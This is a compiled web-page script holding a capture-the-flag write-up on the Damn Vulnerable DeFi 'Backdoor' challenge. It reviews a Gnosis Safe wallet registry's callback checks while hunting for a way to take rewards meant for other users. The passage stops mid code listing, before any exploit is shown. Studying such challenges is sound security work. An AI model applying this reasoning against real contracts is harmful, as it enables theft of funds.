(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[7965],{10838:function(s,e,l){(window.__NEXT_P=window.__NEXT_P||[]).push(["/posts/2022/6/28/damn-vulnerable-defi-v2-11-backdoor",function(){return l(60932)}])},60932:function(s,e,l){"use strict";l.r(e),l.d(e,{__toc:function(){return a}});var n=l(35250),o=l(47147),r=l(77298),i=l(18363),t=l(13423);let a=[{depth:2,value:"Code Review",id:"code-review"},{depth:2,value:"Exploit",id:"exploit"}];function _createMdxContent(s){let e=Object.assign({h1:"h1",a:"a",p:"p",hr:"hr",blockquote:"blockquote",strong:"strong",h2:"h2",em:"em",pre:"pre",code:"code",span:"span"},(0,r.a)(),s.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(e.h1,{children:"Damn Vulnerable DeFi V2 - #11 Backdoor"}),"\n",(0,n.jsxs)("p",{className:"text-xs text-right",children:["June 28, 2022 by ",(0,n.jsx)(e.a,{href:"/about#patrickd",children:"patrickd"})]}),"\n",(0,n.jsx)(e.p,{children:"This is part 8 of the write-up series on Damn Vulnerable DeFi V2. Please consider attempting to solve it on your own first since it's a lot less fun after being spoiled!"}),"\n",(0,n.jsx)(e.hr,{}),"\n",(0,n.jsxs)(e.blockquote,{children:["\n",(0,n.jsx)(e.p,{children:(0,n.jsx)(e.a,{href:"https://www.damnvulnerabledefi.xyz/challenges/11.html",children:(0,n.jsx)(e.strong,{children:"Challenge #11 - Backdoor"})})}),"\n",(0,n.jsxs)(e.p,{children:["To incentivize the creation of more secure wallets in their team, someone has deployed a registry of ",(0,n.jsx)(e.a,{href:"https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol",children:"Gnosis Safe wallets"}),". When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens."]}),"\n",(0,n.jsxs)(e.p,{children:["To make sure everything is safe and sound, the registry tightly integrates with the legitimate ",(0,n.jsx)(e.a,{href:"https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol",children:"Gnosis Safe Proxy Factory"}),", and has some additional safety checks."]}),"\n",(0,n.jsx)(e.p,{children:"Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them."}),"\n",(0,n.jsx)(e.p,{children:"Your goal is to take all funds from the registry. In a single transaction."}),"\n"]}),"\n",(0,n.jsx)(e.h2,{id:"code-review",children:"Code Review"}),"\n",(0,n.jsxs)(e.p,{children:["From the challenge description alone I can't come up with what the issue might be yet. So let's take it step by step and start by reviewing the scenario setup and the success conditions found in the tests: ",(0,n.jsx)(e.a,{href:"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/backdoor/backdoor.challenge.js",children:(0,n.jsx)(e.em,{children:"backdoor.challenge.js"})}),"."]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".masterCopy "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"await"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (await ethers."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"getContractFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'GnosisSafe'"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" deployer))."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"deploy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"();"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".walletFactory "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"await"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (await ethers."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"getContractFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'GnosisSafeProxyFactory'"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" deployer))."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"deploy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"();"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".token "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"await"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (await ethers."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"getContractFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'DamnValuableToken'"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" deployer))."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"deploy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"();"})]})]})}),"\n",(0,n.jsxs)(e.p,{children:["Right away, it deploys 3 contracts: ",(0,n.jsx)(e.em,{children:"GnosisSafe"}),", ",(0,n.jsx)(e.em,{children:"GnosisSafeProxyFactory"}),", ",(0,n.jsx)(e.em,{children:"DamnValuableToken"}),". The ",(0,n.jsx)(e.em,{children:"GnosisSafe"})," contract instance is stored in a variable called ",(0,n.jsx)(e.em,{children:"masterCopy"})," while ",(0,n.jsx)(e.em,{children:"GnosisSafeProxyFactory"}),"'s instance is put into ",(0,n.jsx)(e.em,{children:"walletFactory"}),". If you are familiar with the ",(0,n.jsx)(e.a,{href:"https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/factory-clone/",children:"proxy-factory pattern"})," this should make sense: ",(0,n.jsx)(e.em,{children:"GnosisSafe"})," safe is the Logic Contract that contains the actual business logic of Gnosis Wallets. The ",(0,n.jsx)(e.em,{children:"GnosisSafeProxyFactory"})," is a contract that can produce cheap clones of ",(0,n.jsx)(e.em,{children:"GnosisSafe"}),". Cheap because there's no need to redeploy the entire business logic, just deploying a Proxy contract that delegate-calls to ",(0,n.jsx)(e.em,{children:"GnosisSafe"})," is sufficient since it can execute the master copy's code within the context of its own state."]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".walletRegistry "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"await"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (await ethers."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"getContractFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'WalletRegistry'"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" deployer))."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"deploy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".masterCopy."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".walletFactory."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".token."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    users"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})})]})}),"\n",(0,n.jsxs)(e.p,{children:["Next up, it deploys the ",(0,n.jsx)(e.em,{children:"WalletRegistry"})," contract, the main target of this challenge, and passes to it the addresses of the previously deployed contracts, plus the four mentioned beneficiaries. After these users are registered on the contract as such, the registry is given the 40 DVT of rewards that belong to each of them."]}),"\n",(0,n.jsx)(e.p,{children:"That's it for the setup, it's simpler than expected and, while we might need some basic understanding of Gnosis, we'll probably just have to take a very good look at the registry contract to find the issue."}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"let"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" wallet "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" await "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".walletRegistry."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"wallets"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(users[i]);"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"expect"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(wallet).to.not."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"eq"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(ethers.constants.AddressZero"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"User did not register a wallet"'}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"expect"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(await "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".walletRegistry."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"beneficiaries"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(users[i])).to.be."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"false"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:";"})]})]})}),"\n",(0,n.jsxs)(e.p,{children:["As expected the success conditions require us to move all 40 DamnValuableTokens into the ",(0,n.jsx)(e.em,{children:"attacker"})," account, but what's more interesting is that they require all of the 4 users to no longer be registered as beneficiaries but have a registered Wallet - that seems like a pretty big hint! During the setup no Wallets were created for each user to be able to claim these rewards. So most likely we'll be able to claim them for ourselves with our own wallets despite not being an eligible user."]}),"\n",(0,n.jsx)(e.hr,{}),"\n",(0,n.jsxs)(e.p,{children:["Let's look at the only contract that is specific to this challenge first, ",(0,n.jsx)(e.a,{href:"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/contracts/backdoor/WalletRegistry.sol",children:(0,n.jsx)(e.em,{children:"WalletRegistry.sol"})}),", and see if it's possible to find the issue without knowing much about Gnosis itself."]}),"\n",(0,n.jsx)(e.pre,{"data-language":"text","data-theme":"default",children:(0,n.jsx)(e.code,{"data-language":"text","data-theme":"default",children:(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored."})})})}),"\n",(0,n.jsx)(e.p,{children:"I guess that is called foreshadowing?"}),"\n",(0,n.jsx)(e.p,{children:"Most of the code can be skipped, things start to get interesting here:"}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/**"})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@notice"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" Function executed when user creates a Gnosis Safe wallet via"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" GnosisSafeProxyFactory::createProxyWithCallback setting the registry's address as the callback."})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"*/"})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"function"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"proxyCreated"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"GnosisSafeProxy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" proxy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" singleton"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"bytes"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"calldata"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" initializer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:") "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"external"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"override"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]})]})}),"\n",(0,n.jsxs)(e.p,{children:['The first thing that comes to mind when reading "callback function" is: Does it make sure that it can really only be invoked by the expected caller, in this case, the ',(0,n.jsx)(e.em,{children:"GnosisSafeProxyFactory"}),"?"]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"require"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(msg.sender "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"=="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" walletFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"Caller must be factory"'}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"require"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(singleton "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"=="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" masterCopy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"Fake mastercopy used"'}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]})]})}),"\n",(0,n.jsxs)(e.p,{children:["Yes, it does, guess that would've been too easy. And it's also checking that the used master copy (singleton) was the real ",(0,n.jsx)(e.em,{children:"GnosisSafe"})," logic contract - so we can't make use of a manipulated wallet to return fake data."]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Ensure initial calldata was a call to `GnosisSafe::setup`"})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"require"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"bytes4"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(initializer["}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"4"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"]) "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"=="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" GnosisSafe.setup.selector"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"Wrong initialization"'}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]})]})}),"\n",(0,n.jsxs)(e.p,{children:["I assume this is supposed to ensure that, after the Proxy was deployed, the wallet was initialized using the ",(0,n.jsx)(e.em,{children:"setup"})," function and no other. Not sure whether that'll end up being relevant yet."]}),"\n",(0,n.jsx)(e.p,{children:"Anyway, so where does it check whether the owner of the wallet, the person who initiated the wallet creation triggering this callback in the first place, is actually a beneficiary?"}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"require"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"GnosisSafe"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(walletAddress)."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"getThreshold"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"() "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"=="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" MAX_THRESHOLD"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"Invalid threshold"'}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"require"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"GnosisSafe"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(walletAddress)."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"getOwners"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"().length "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"=="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" MAX_OWNERS"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"Invalid number of owners"'}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" walletOwner "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"GnosisSafe"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(walletAddress)."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"getOwners"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"()["}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"];"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"require"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(beneficiaries[walletOwner]"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"Owner is not registered as beneficiary"'}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]})]})}),"\n",(0,n.jsxs)(e.p,{children:["There it is, it fetches the first owner of the wallet and checks whether they are a registered beneficiary. Note that ",(0,n.jsx)(e.em,{children:"MAX_THRESHOLD"})," and ",(0,n.jsx)(e.em,{children:"MAX_OWNERS"})," are both 1, so we can't simply bypass it by being a secondary owner either."]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"_removeBeneficiary"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(walletOwner);"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"wallets[walletOwner] "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" walletAddress;"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"token."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"transfer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(walletAddress"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" TOKEN_PAYMENT);"})]})]})}),"\n",(0,n.jsx)(e.p,{children:"The functions wraps up by removing the beneficiary, registering their wallet address, and transferring the reward tokens to it."}),"\n",(0,n.jsx)(e.p,{children:"It seems that there must be some way to have control over a Gnosis wallet as a creator without currently being one of its owners?"}),"\n",(0,n.jsx)(e.hr,{}),"\n",(0,n.jsxs)(e.p,{children:["Let's take a look at ",(0,n.jsx)(e.a,{href:"https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol",children:(0,n.jsx)(e.em,{children:"GnosisSafeProxyFactory"})})," now since that is the only contract being able to call into the registry's callback function."]}),"\n",(0,n.jsxs)(e.p,{children:["First, I checked whether there's any other function than ",(0,n.jsx)(e.em,{children:"createProxyWithCallback"})," that would allow making calls to the registry, but I didn't see any."]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"function"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"createProxyWithCallback"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" 